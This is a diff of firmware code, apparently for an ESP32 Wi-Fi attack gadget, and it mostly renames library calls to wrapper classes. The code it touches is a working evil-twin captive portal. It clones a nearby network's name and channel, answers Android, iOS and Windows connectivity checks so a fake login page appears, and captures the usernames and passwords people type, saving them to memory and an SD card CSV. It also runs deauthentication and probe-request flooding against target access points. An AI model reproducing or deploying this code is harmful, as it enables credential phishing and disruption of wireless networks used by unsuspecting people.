+static void cpCredListStatus(const DivString& msg, uint16_t color) {
   const int y = max(50, wifiContentBottom() - 16);
   tft.fillRect(0, y, 240, 16, TFT_BLACK);
   tft.setTextColor(color, TFT_BLACK);
@@ -3021,7 +3022,7 @@ static void cpCredListStatus(const String& msg, uint16_t color) {
   tft.print(msg);
 }
 
-static void cpStartDeauth(const String& ssid, const uint8_t* bssid, uint8_t channel) {
+static void cpStartDeauth(const DivString& ssid, const uint8_t* bssid, uint8_t channel) {
   if (cp_deauth_active) return;
 
   memset(&cp_target_ap, 0, sizeof(cp_target_ap));
@@ -3035,14 +3036,14 @@ static void cpStartDeauth(const String& ssid, const uint8_t* bssid, uint8_t chan
   cp_deauth_success_count = 0;
   cp_last_deauth_time = 0;
 
-  Serial.printf("[CP Deauth] Starting deauth against cloned AP: %s CH=%u\n", ssid.c_str(), channel);
+  DivSerial.printf("[CP Deauth] Starting deauth against cloned AP: %s CH=%u\n", ssid.c_str(), channel);
 }
 
 static void cpStopDeauth() {
   if (!cp_deauth_active) return;
 
   cp_deauth_active = false;
-  Serial.printf("[CP Deauth] Stopped deauth (packets: %u, success: %u)\n",
+  DivSerial.printf("[CP Deauth] Stopped deauth (packets: %u, success: %u)\n",
                 (unsigned)cp_deauth_packet_count, (unsigned)cp_deauth_success_count);
 }
 
@@ -3084,55 +3085,55 @@ static void cpHttpSend(httpd_req_t* req, int status, const char* contentType, co
 }
 
 static esp_err_t cpHandleGenerate204(httpd_req_t* req) {
-  Serial.println("Android /generate_204 requested");
+  DivSerial.println("Android /generate_204 requested");
   displayPrint("Android /generate_204 requested", GREEN, false);
   cpHttpSend(req, 302, "text/plain", "");
   return ESP_OK;
 }
 
 static esp_err_t cpHandleHotspotDetect(httpd_req_t* req) {
-  Serial.println("iOS /hotspot-detect.html requested");
+  DivSerial.println("iOS /hotspot-detect.html requested");
   displayPrint("iOS /hotspot-detect.html requested", GREEN, false);
   cpHttpSend(req, 200, "text/html", loginPage.c_str());
   return ESP_OK;
 }
 
 static esp_err_t cpHandleCaptiveApple(httpd_req_t* req) {
-  Serial.println("iOS /captive.apple.com requested");
+  DivSerial.println("iOS /captive.apple.com requested");
   displayPrint("iOS /captive.apple.com requested", GREEN, false);
   cpHttpSend(req, 200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
   return ESP_OK;
 }
 
 static esp_err_t cpHandleNCSITxt(httpd_req_t* req) {
-  Serial.println("Windows /ncsi.txt requested");
+  DivSerial.println("Windows /ncsi.txt requested");
   displayPrint("Windows /ncsi.txt requested", GREEN, false);
   cpHttpSend(req, 200, "text/plain", "Microsoft NCSI");
   return ESP_OK;
 }
 
 static esp_err_t cpHandleConnectTestTxt(httpd_req_t* req) {
-  Serial.println("Windows /connecttest.txt requested");
+  DivSerial.println("Windows /connecttest.txt requested");
   displayPrint("Windows /connecttest.txt requested", GREEN, false);
   cpHttpSend(req, 200, "text/plain", "Microsoft Connect Test");
   return ESP_OK;
 }
 
 static esp_err_t cpHandleLoginPage(httpd_req_t* req) {
-  Serial.println("Login page (/login.html) requested");
+  DivSerial.println("Login page (/login.html) requested");
   displayPrint("Login page (/login.html) requested", GREEN, false);
   cpHttpSend(req, 200, "text/html", loginPage.c_str());
   return ESP_OK;
 }
 
 static esp_err_t cpHandleRoot(httpd_req_t* req) {
-  Serial.println("Root (/) requested");
+  DivSerial.println("Root (/) requested");
   displayPrint("Root (/) requested", GREEN, false);
   cpHttpSend(req, 200, "text/html", loginPage.c_str());
   return ESP_OK;
 }
 
-static bool cpReadBody(httpd_req_t* req, String& out) {
+static bool cpReadBody(httpd_req_t* req, DivString& out) {
   const size_t len = req->content_len;
   out = "";
   if (len == 0) return true;
@@ -3152,8 +3153,8 @@ static bool cpReadBody(httpd_req_t* req, String& out) {
   return true;
 }
 
-static String cpUrlDecode(const String& s) {
-  String out;
+static DivString cpUrlDecode(const DivString& s) {
+  DivString out;
   out.reserve(s.length());
   for (size_t i = 0; i < s.length(); ++i) {
     char c = s[i];
@@ -3170,8 +3171,8 @@ static String cpUrlDecode(const String& s) {
   return out;
 }
 
-static String cpFormValue(const String& body, const char* key) {
-  const String prefix = String(key) + "=";
+static DivString cpFormValue(const DivString& body, const char* key) {
+  const DivString prefix = DivString(key) + "=";
   int start = body.indexOf(prefix);
   if (start < 0) return "";
   start += (int)prefix.length();
@@ -3181,37 +3182,37 @@ static String cpFormValue(const String& body, const char* key) {
 }
 
 static esp_err_t cpHandleLoginPost(httpd_req_t* req) {
-  String body;
+  DivString body;
   if (!cpReadBody(req, body)) {
     cpHttpSend(req, 500, "text/plain", "read failed");
     return ESP_FAIL;
   }
 
-  String username = cpFormValue(body, "username");
-  String password = cpFormValue(body, "password");
-  String remoteIp = "";
+  DivString username = cpFormValue(body, "username");
+  DivString password = cpFormValue(body, "password");
+  DivString remoteIp = "";
   char ipBuf[16] = {0};
   if (req && req->user_ctx) {
     remoteIp = (const char*)req->user_ctx;
   } else {
     remoteIp = "0.0.0.0";
   }
-  Serial.println("Captured Credentials:");
-  Serial.printf("Username: %s\n", username.c_str());
-  Serial.printf("Password: %s\n", password.c_str());
-  Serial.printf("SSID: %s\n", custom_ssid);
+  DivSerial.println("Captured Credentials:");
+  DivSerial.printf("Username: %s\n", username.c_str());
+  DivSerial.printf("Password: %s\n", password.c_str());
+  DivSerial.printf("SSID: %s\n", custom_ssid);
   saveCredential(username, password, custom_ssid);
-  if (cpAppendCaptureToSD(remoteIp, username, password, String(custom_ssid))) {
-    Serial.println("[SD] Captive capture appended to /captive_portal/captured.csv");
+  if (cpAppendCaptureToSD(remoteIp, username, password, DivString(custom_ssid))) {
+    DivSerial.println("[SD] Captive capture appended to /captive_portal/captured.csv");
   } else {
-    Serial.println("[SD] Captive capture export failed (SD not mounted / write error)");
+    DivSerial.println("[SD] Captive capture export failed (SD not mounted / write error)");
   }
   cpHttpSend(req, 200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
   return ESP_OK;
 }
 
 static esp_err_t cpHandleNotFound(httpd_req_t* req) {
-  Serial.printf("Not found: %s\n", req->uri);
+  DivSerial.printf("Not found: %s\n", req->uri);
   cpHttpSend(req, 302, "text/plain", "");
   return ESP_OK;
 }
@@ -3256,9 +3257,9 @@ static void stopWebServer() {
 }
 
 void loadSSID() {
-  String savedSSID = "";
+  DivString savedSSID = "";
   for (int i = 0; i < 32; i++) {
-    char c = EEPROM.read(SSID_ADDR + i);
+    char c = DivNvStore.read(SSID_ADDR + i);
     if (c == 0) break;
     savedSSID += c;
   }
@@ -3269,56 +3270,56 @@ void loadSSID() {
   }
 }
 
-void saveSSID(String ssid) {
+void saveSSID(DivString ssid) {
   for (int i = 0; i < 32; i++) {
     if (i < ssid.length()) {
-      EEPROM.write(SSID_ADDR + i, ssid[i]);
+      DivNvStore.write(SSID_ADDR + i, ssid[i]);
     } else {
-      EEPROM.write(SSID_ADDR + i, 0);
+      DivNvStore.write(SSID_ADDR + i, 0);
     }
   }
-  EEPROM.commit();
+  DivNvStore.commit();
   ssid.toCharArray(custom_ssid, 32);
   if (attackActive) {
-    WiFi.softAPdisconnect(true);
-    WiFi.softAP(custom_ssid, password, ap_channel);
-    Serial.printf("New SSID set: %s\n", custom_ssid);
+    DivWiFi.softAPdisconnect(true);
+    DivWiFi.softAP(custom_ssid, password, ap_channel);
+    DivSerial.printf("New SSID set: %s\n", custom_ssid);
   }
 }
 
 void deleteCredential(int index) {
-  int count = EEPROM.read(COUNT_ADDR);
+  int count = DivNvStore.read(COUNT_ADDR);
   if (index < 0 || index >= count) {
-    Serial.printf("Invalid credential index: %d\n", index);
+    DivSerial.printf("Invalid credential index: %d\n", index);
     return;
   }
 
   for (int i = index; i < count - 1; i++) {
     Credential cred;
-    EEPROM.get(CRED_ADDR + ((i + 1) * CRED_SIZE), cred);
-    EEPROM.put(CRED_ADDR + (i * CRED_SIZE), cred);
+    DivNvStore.get(CRED_ADDR + ((i + 1) * CRED_SIZE), cred);
+    DivNvStore.put(CRED_ADDR + (i * CRED_SIZE), cred);
   }
 
   count--;
-  EEPROM.write(COUNT_ADDR, count);
-  EEPROM.commit();
-  Serial.printf("Credential deleted at index %d\n", index);
-  Serial.printf("New credential count: %d\n", count);
+  DivNvStore.write(COUNT_ADDR, count);
+  DivNvStore.commit();
+  DivSerial.printf("Credential deleted at index %d\n", index);
+  DivSerial.printf("New credential count: %d\n", count);
 }
 
 void clearAllCredentials() {
-  EEPROM.put(COUNT_ADDR, (uint32_t)0);
+  DivNvStore.put(COUNT_ADDR, (uint32_t)0);
 
   int endAddr = CRED_ADDR + (MAX_CREDS * CRED_SIZE);
   if (endAddr > COUNT_ADDR) {
-    Serial.println("Error: Credential clear would overwrite counter!");
+    DivSerial.println("Error: Credential clear would overwrite counter!");
     endAddr = COUNT_ADDR;
   }
   for (int i = CRED_ADDR; i < endAddr; i++) {
-    EEPROM.write(i, 0);
+    DivNvStore.write(i, 0);
   }
-  EEPROM.commit();
-  Serial.printf("All credentials cleared from %d to %d\n", CRED_ADDR, endAddr - 1);
+  DivNvStore.commit();
+  DivSerial.printf("All credentials cleared from %d to %d\n", CRED_ADDR, endAddr - 1);
 }
 
 static void cpDrawCloneFrame(const char* title, const char* subtitle = nullptr) {
@@ -3362,7 +3363,7 @@ static void cpCloneDrawListHint() {
   tft.print("Tap row or Pick to clone");
 }
 
-static void cpCloneDrawRow(int displayNum, const String& ssid, int rssi, int ch,
+static void cpCloneDrawRow(int displayNum, const DivString& ssid, int rssi, int ch,
                            uint8_t auth, int y, bool selected) {
   char ssidBuf[16];
   if (ssid.length() == 0) {
@@ -3392,8 +3393,8 @@ static void cpCloneDrawRow(int displayNum, const String& ssid, int rssi, int ch,
 
 static void cpCloneDrawRowAt(int rowIdx, int sortedIdx, const int* idx, int y, bool selected) {
   const int real = idx[sortedIdx];
-  cpCloneDrawRow(rowIdx + 1, WiFi.SSID(real), WiFi.RSSI(real), WiFi.channel(real),
-                 WiFi.encryptionType(real), y, selected);
+  cpCloneDrawRow(rowIdx + 1, DivWiFi.SSID(real), DivWiFi.RSSI(real), DivWiFi.channel(real),
+                 DivWiFi.encryptionType(real), y, selected);
 }
 
 static void cpCloneDrawNetworkList(int count, const int* idx, int selectedIdx, bool forceFull) {
@@ -3572,18 +3573,18 @@ static void cpDrawCloneFooter(bool prevEnabled, bool nextEnabled, bool pickMode 
 }
 
 static bool cpCloneFillSelection(int sortedIdx, const int* idx, int count,
-                                 String& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
+                                 DivString& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
   if (sortedIdx < 0 || sortedIdx >= count) {
     return false;
   }
   const int real = idx[sortedIdx];
-  outSsid = WiFi.SSID(real);
-  outChannel = (uint8_t)WiFi.channel(real);
-  memcpy(outBssid, WiFi.BSSID(real), 6);
+  outSsid = DivWiFi.SSID(real);
+  outChannel = (uint8_t)DivWiFi.channel(real);
+  memcpy(outBssid, DivWiFi.BSSID(real), 6);
   return true;
 }
 
-static bool cpCloneScanAndSelect(String& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
+static bool cpCloneScanAndSelect(DivString& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
   const int MAX_RESULTS = 40;
 
   s_cloneUiActive = true;
@@ -3592,12 +3593,12 @@ static bool cpCloneScanAndSelect(String& outSsid, uint8_t& outChannel, uint8_t o
   while (true) {
     cpCloneDrawScanning();
 
-    WiFi.scanDelete();
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
+    DivWiFi.scanDelete();
+    DivWiFi.mode(WIFI_STA);
+    DivWiFi.disconnect();
     delay(50);
     const uint32_t dwell = wifiStaScanMsPerChannel();
-    int n = WiFi.scanNetworks(false, true, false, dwell);
+    int n = DivWiFi.scanNetworks(false, true, false, dwell);
     if (n <= 0) {
       cpCloneDrawEmpty();
       cpDrawCloneFooter(false, false, false);
@@ -3622,7 +3623,7 @@ static bool cpCloneScanAndSelect(String& outSsid, uint8_t& outChannel, uint8_t o
     for (int i = 0; i < count - 1; i++) {
       int best = i;
       for (int j = i + 1; j < count; j++) {
-        if (WiFi.RSSI(idx[j]) > WiFi.RSSI(idx[best])) best = j;
+        if (DivWiFi.RSSI(idx[j]) > DivWiFi.RSSI(idx[best])) best = j;
       }
       if (best != i) {
         int tmp = idx[i];
@@ -3692,15 +3693,15 @@ static void cpCloneExistingAPFlow() {
   bool wasActive = attackActive;
   if (attackActive) stopAttack();
 
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect(true);
+  DivWiFi.mode(WIFI_STA);
+  DivWiFi.disconnect(true);
   delay(100);
 
-  String chosen;
+  DivString chosen;
   uint8_t ch = 1;
   uint8_t bssid[6] = {0};
   bool ok = cpCloneScanAndSelect(chosen, ch, bssid);
-  WiFi.scanDelete();
+  DivWiFi.scanDelete();
 
   if (!ok) {
     if (wasActive) startAttack();
@@ -3710,7 +3711,7 @@ static void cpCloneExistingAPFlow() {
 
   ap_channel = (ch == 0 ? 1 : ch);
   saveSSID(chosen);
-  Serial.printf("[CP] Cloned AP: SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);
+  DivSerial.printf("[CP] Cloned AP: SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);
 
   memset(&cp_target_ap, 0, sizeof(cp_target_ap));
   strcpy((char*)cp_target_ap.ssid, chosen.c_str());
@@ -3787,8 +3788,8 @@ void drawCredList() {
   tft.print("SSID");
   tft.drawFastHLine(0, 80, 245, UI_LINE);
 
-  int count = EEPROM.read(COUNT_ADDR);
-  Serial.printf("Reading %d credentials from EEPROM\n", count);
+  int count = DivNvStore.read(COUNT_ADDR);
+  DivSerial.printf("Reading %d credentials from DivNvStore\n", count);
 
   int startIdx = credPage * kCredRowsPerPage;
   int yOffset = 90;
@@ -3796,12 +3797,12 @@ void drawCredList() {
   if (count == 0) {
     tft.setCursor(0, yOffset);
     tft.println("No credentials");
-    Serial.println("No credentials found");
+    DivSerial.println("No credentials found");
   } else {
     for (int i = startIdx; i < min(count, startIdx + kCredRowsPerPage); i++) {
       Credential cred;
-      EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
-      Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s\n",
+      DivNvStore.get(CRED_ADDR + (i * CRED_SIZE), cred);
+      DivSerial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s\n",
                     i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid);
 
       tft.setTextColor(WHITE, TFT_BLACK);
@@ -3852,12 +3853,12 @@ void drawCredList() {
 
 void stopAttack() {
   if (attackActive) {
-    WiFi.softAPdisconnect(true);
-    Serial.println("Access Point stopped");
+    DivWiFi.softAPdisconnect(true);
+    DivSerial.println("Access Point stopped");
     displayPrint("Access Point stopped", GREEN, false);
 
     stopWebServer();
-    Serial.println("Web server stopped");
+    DivSerial.println("Web server stopped");
     displayPrint("Web server stopped", GREEN, false);
 
     cpStopDeauth();
@@ -3865,32 +3866,32 @@ void stopAttack() {
     attackActive = false;
     drawMainMenu();
   } else {
-    Serial.println("Attack already inactive");
+    DivSerial.println("Attack already inactive");
     displayPrint("Attack already inactive", GREEN, false);
   }
 }
 
 void startAttack() {
   if (!attackActive) {
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP(custom_ssid, password, ap_channel);
-    Serial.println("Access Point started");
-    Serial.print("IP Address: ");
-    Serial.println(WiFi.softAPIP());
+    DivWiFi.mode(WIFI_AP);
+    DivWiFi.softAP(custom_ssid, password, ap_channel);
+    DivSerial.println("Access Point started");
+    DivSerial.print("IP Address: ");
+    DivSerial.println(DivWiFi.softAPIP());
     displayPrint("Access Point started", GREEN, false);
 
     if (!setupWebServer()) {
-      Serial.println("Web server failed to start");
+      DivSerial.println("Web server failed to start");
       displayPrint("Web server failed to start", UI_WARN, false);
       return;
     }
-    Serial.println("Web server started");
+    DivSerial.println("Web server started");
     displayPrint("Web server started", GREEN, false);
 
     attackActive = true;
     drawMainMenu();
   } else {
-    Serial.println("Attack already active");
+    DivSerial.println("Attack already active");
     displayPrint("Attack already active", GREEN, false);
   }
 }
@@ -3901,13 +3902,13 @@ void handleMainMenu(int x, int y) {
 }
 
 void handleCredList(int x, int y) {
-  int count = EEPROM.read(COUNT_ADDR);
+  int count = DivNvStore.read(COUNT_ADDR);
   int startIdx = credPage * kCredRowsPerPage;
   int yOffset = 80;
 
   for (int i = startIdx; i < min(count, startIdx + kCredRowsPerPage); i++) {
     if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
-      Serial.printf("Delete button pressed for credential %d\n", i);
+      DivSerial.printf("Delete button pressed for credential %d\n", i);
       deleteCredential(i);
       drawCredList();
       return;
@@ -3922,18 +3923,18 @@ void handleCredList(int x, int y) {
   const int buttonY = 290;
 
   if (x >= 5 && x <= 55 && y >= buttonY && y <= buttonY + 20) {
-    Serial.println("Back button pressed");
+    DivSerial.println("Back button pressed");
     currentScreen = MAIN_MENU;
     drawMainMenu();
   }
   if (x >= 65 && x <= 115 && y >= buttonY && y <= buttonY + 20) {
-    Serial.println("Clear All button pressed");
+    DivSerial.println("Clear All button pressed");
     clearAllCredentials();
     credPage = 0;
     drawCredList();
   }
   if (x >= 125 && x <= 175 && y >= buttonY && y <= buttonY + 20) {
-    Serial.println("Export button pressed");
+    DivSerial.println("Export button pressed");
     int dumped = 0;
     if (cpDumpAllCredentialsToSD(&dumped)) {
       char status[96];
@@ -3944,11 +3945,11 @@ void handleCredList(int x, int y) {
     }
   }
   if (credPage > 0 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
-    Serial.println("Prev button pressed");
+    DivSerial.println("Prev button pressed");
     credPage--;
     drawCredList();
   } else if (count > (credPage + 1) * kCredRowsPerPage && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
-    Serial.println("Next button pressed");
+    DivSerial.println("Next button pressed");
     credPage++;
     drawCredList();
   }
@@ -4101,7 +4102,7 @@ static void cportalUpdateNavLabels() {
                       s_clonePrevEn ? "Prev" : nullptr,
                       s_clonePickMode ? "Pick" : nullptr);
   } else if (currentScreen == CRED_LIST) {
-    const int count = EEPROM.read(COUNT_ADDR);
+    const int count = DivNvStore.read(COUNT_ADDR);
     const bool hasPrev = credPage > 0;
     const bool hasNext = count > (credPage + 1) * kCredRowsPerPage;
     setTouchNavLabels("Back", "Clear", "Exit", "Export", hasNext ? "Next" : (hasPrev ? "Prev" : nullptr));
@@ -4166,7 +4167,7 @@ static void cportalHandleCredNavButtons() {
   if (now - cportalLastBtnMs < cportalDebounceMs) {
     return;
   }
-  const int count = EEPROM.read(COUNT_ADDR);
+  const int count = DivNvStore.read(COUNT_ADDR);
 
   const bool hasPrev = credPage > 0;
   const bool hasNext = count > (credPage + 1) * kCredRowsPerPage;
@@ -4225,12 +4226,12 @@ void cportalSetup() {
   redrawTouchButtonBar();
   runUI();
 
-  EEPROM.begin(EEPROM_SIZE);
-  int count = EEPROM.read(COUNT_ADDR);
+  DivNvStore.begin(NVSTORE_SIZE);
+  int count = DivNvStore.read(COUNT_ADDR);
   if (count > MAX_CREDS || count < 0) {
-    Serial.println("Invalid credential count, resetting to 0");
-    EEPROM.write(COUNT_ADDR, 0);
-    EEPROM.commit();
+    DivSerial.println("Invalid credential count, resetting to 0");
+    DivNvStore.write(COUNT_ADDR, 0);
+    DivNvStore.commit();
   }
   loadSSID();
 
@@ -4492,11 +4493,11 @@ bool scanNetworks() {
 
     for (int i = 0; i < network_count; i++) {
         wifi_ap_record_t ap_record = {0};
-        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
-        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
-        ap_record.rssi = WiFi.RSSI(i);
-        ap_record.primary = WiFi.channel(i);
-        ap_record.authmode = WiFi.encryptionType(i);
+        memcpy(ap_record.bssid, DivWiFi.BSSID(i), 6);
+        strncpy((char*)ap_record.ssid, DivWiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
+        ap_record.rssi = DivWiFi.RSSI(i);
+        ap_record.primary = DivWiFi.channel(i);
+        ap_record.authmode = DivWiFi.encryptionType(i);
         ap_list[i] = ap_record;
     }
 
@@ -4509,15 +4510,15 @@ bool scanNetworks() {
 bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
     const int n = WifiScan::staWifiScanSync();
     for (int i = 0; i < n; i++) {
-        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
-            *channel = WiFi.channel(i);
-            WiFi.mode(WIFI_AP);
+        if (memcmp(DivWiFi.BSSID(i), bssid, 6) == 0) {
+            *channel = DivWiFi.channel(i);
+            DivWiFi.mode(WIFI_AP);
             delay(100);
             return true;
         }
     }
 
-    WiFi.mode(WIFI_AP);
+    DivWiFi.mode(WIFI_AP);
     delay(100);
     return false;
 }
@@ -4575,7 +4576,7 @@ void drawAttackScreen() {
     tft.setCursor(10, 130);
     tft.println(buf);
 
-    snprintf(buf, sizeof(buf), "Heap: %lu", (unsigned long)ESP.getFreeHeap());
+    snprintf(buf, sizeof(buf), "Heap: %lu", (unsigned long)DivSystem.getFreeHeap());
     tft.setCursor(10, 145);
     tft.println(buf);
 
@@ -4862,7 +4863,7 @@ void deautherLoop() {
 
     uint32_t current_time = millis();
     if (attack_running && selected_ap_index != -1) {
-        uint32_t heap = ESP.getFreeHeap();
+        uint32_t heap = DivSystem.getFreeHeap();
         if (heap < 80000) {
             attack_running = false;
             last_packet_time = 0;
@@ -5177,11 +5178,11 @@ bool scanNetworks() {
 
     for (int i = 0; i < network_count; i++) {
         wifi_ap_record_t ap_record = {0};
-        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
-        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
-        ap_record.rssi = WiFi.RSSI(i);
-        ap_record.primary = WiFi.channel(i);
-        ap_record.authmode = WiFi.encryptionType(i);
+        memcpy(ap_record.bssid, DivWiFi.BSSID(i), 6);
+        strncpy((char*)ap_record.ssid, DivWiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
+        ap_record.rssi = DivWiFi.RSSI(i);
+        ap_record.primary = DivWiFi.channel(i);
+        ap_record.authmode = DivWiFi.encryptionType(i);
         ap_list[i] = ap_record;
     }
 
@@ -5194,15 +5195,15 @@ bool scanNetworks() {
 bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
     const int n = WifiScan::staWifiScanSync();
     for (int i = 0; i < n; i++) {
-        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
-            *channel = WiFi.channel(i);
-            WiFi.mode(WIFI_AP);
+        if (memcmp(DivWiFi.BSSID(i), bssid, 6) == 0) {
+            *channel = DivWiFi.channel(i);
+            DivWiFi.mode(WIFI_AP);
             delay(100);
             return true;
         }
     }
 
-    WiFi.mode(WIFI_AP);
+    DivWiFi.mode(WIFI_AP);
     delay(100);
     return false;
 }
@@ -5260,7 +5261,7 @@ void drawAttackScreen() {
     tft.setCursor(10, 130);
     tft.println(buf);
 
-    snprintf(buf, sizeof(buf), "Heap: %lu", (unsigned long)ESP.getFreeHeap());
+    snprintf(buf, sizeof(buf), "Heap: %lu", (unsigned long)DivSystem.getFreeHeap());
     tft.setCursor(10, 145);
     tft.println(buf);
 
@@ -5545,7 +5546,7 @@ void probeRequestFloodLoop() {
 
     uint32_t current_time = millis();
     if (attack_running && selected_ap_index != -1) {
-        uint32_t heap = ESP.getFreeHeap();
+        uint32_t heap = DivSystem.getFreeHeap();
         if (heap < 80000) {
             attack_running = false;
             last_packet_time = 0;
@@ -6370,7 +6371,7 @@ void performSDUpdate() {
     tft.setCursor(10, 40 + yshift);
     tft.println("SD card OK");
 
-    if (!SD.exists(FIRMWARE_FILE)) {
+    if (!DivSd.exists(FIRMWARE_FILE)) {
       tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 30 + yshift);
       tft.println("X Firmware not found!");
@@ -6392,7 +6393,7 @@ void performSDUpdate() {
       continue;
     }
 
-    File firmwareFile = SD.open(FIRMWARE_FILE, FILE_READ);
+    DivFile firmwareFile = DivSd.open(FIRMWARE_FILE, FILE_READ);
     if (!firmwareFile) {
       tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 30 + yshift);
@@ -6450,11 +6451,11 @@ bool selectWiFiNetwork() {
   tft.setTextColor(GREEN);
   tft.setTextSize(1);
   tft.println("Scanning.");
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
+  DivWiFi.mode(WIFI_STA);
+  DivWiFi.disconnect();
   delay(100);
 
-  int numNetworks = WiFi.scanNetworks();
+  int numNetworks = DivWiFi.scanNetworks();
   if (numNetworks <= 0) {
     tft.fillRect(0, 37, 240, 320, TFT_BLACK);
     tft.drawFastHLine(0, 19, 240, UI_LINE);
@@ -6493,11 +6494,11 @@ bool selectWiFiNetwork() {
 
   NetworkInfo* networks = new NetworkInfo[numNetworks];
   for (int i = 0; i < numNetworks; i++) {
-    strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 31);
+    strncpy(networks[i].ssid, DivWiFi.SSID(i).c_str(), 31);
     networks[i].ssid[31] = '\0';
-    networks[i].rssi = WiFi.RSSI(i);
-    networks[i].channel = WiFi.channel(i);
-    networks[i].authmode = WiFi.encryptionType(i);
+    networks[i].rssi = DivWiFi.RSSI(i);
+    networks[i].channel = DivWiFi.channel(i);
+    networks[i].authmode = DivWiFi.encryptionType(i);
   }
 
   int startIndex = 0;
@@ -6762,7 +6763,7 @@ static esp_err_t fwUpdatePostHandler(httpd_req_t* req) {
   httpd_resp_set_type(req, "text/plain");
   httpd_resp_send(req, "OK", HTTPD_RESP_USE_STRLEN);
   delay(2000);
-  ESP.restart();
+  DivSystem.restart();
   return ESP_OK;
 }
 
@@ -6821,10 +6822,10 @@ void performWebOTAUpdate() {
   tft.setCursor(10, 30 + yshift);
   tft.println("Connecting Wi-Fi");
   fwEnsureToolbar();
-  WiFi.begin(selectedSSID, wifiPassword);
+  DivWiFi.begin(selectedSSID, wifiPassword);
   int attempts = 0;
   uint32_t lastConnectPollMs = 0;
-  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
+  while (DivWiFi.status() != WL_CONNECTED && attempts < 20) {
     const uint32_t now = millis();
     if ((uint32_t)(now - lastConnectPollMs) >= 50u) {
       lastConnectPollMs = now;
@@ -6832,12 +6833,12 @@ void performWebOTAUpdate() {
         maintainTouchNavBar();
       }
       if (feature_exit_requested || fwActionPressed("Back")) {
-        WiFi.disconnect();
+        DivWiFi.disconnect();
         return;
       }
       int x, y;
       if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
-        WiFi.disconnect();
+        DivWiFi.disconnect();
         drawMenu();
         return;
       }
@@ -6845,11 +6846,11 @@ void performWebOTAUpdate() {
     delay(500);
     attempts++;
   }
-  if (WiFi.status() != WL_CONNECTED) {
+  if (DivWiFi.status() != WL_CONNECTED) {
     fwUpdateUiFail();
     int x, y;
     if (waitForTouchXY(x, y)) {
-      WiFi.disconnect();
+      DivWiFi.disconnect();
       drawMenu();
       return;
     }
@@ -6863,7 +6864,7 @@ void performWebOTAUpdate() {
   tft.setTextColor(TFT_WHITE, TFT_BLACK);
   tft.setCursor(10, 50 + yshift);
   tft.print("IP: ");
-  tft.println(WiFi.localIP());
+  tft.println(DivWiFi.localIP());
   tft.setCursor(10, 70 + yshift);
   tft.println("URL: http://esp32.local");
   tft.setCursor(10, 80 + yshift);
@@ -6881,7 +6882,7 @@ void performWebOTAUpdate() {
     fwRestoreNavChrome();
     int x, y;
     if (waitForTouchXY(x, y)) {
-      WiFi.disconnect();
+      DivWiFi.disconnect();
       drawMenu();
       return;
     }
@@ -6904,7 +6905,7 @@ void performWebOTAUpdate() {
     fwUpdateUiFail();
     int x, y;
     if (waitForTouchXY(x, y)) {
-      WiFi.disconnect();
+      DivWiFi.disconnect();
       drawMenu();
       return;
     }
@@ -6923,13 +6924,13 @@ void performWebOTAUpdate() {
       }
       if (feature_exit_requested || fwActionPressed("Back")) {
         fwStopHttpServer();
-        WiFi.disconnect();
+        DivWiFi.disconnect();
         return;
       }
       int x, y;
       if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
         fwStopHttpServer();
-        WiFi.disconnect();
+        DivWiFi.disconnect();
         drawMenu();
         return;
       }
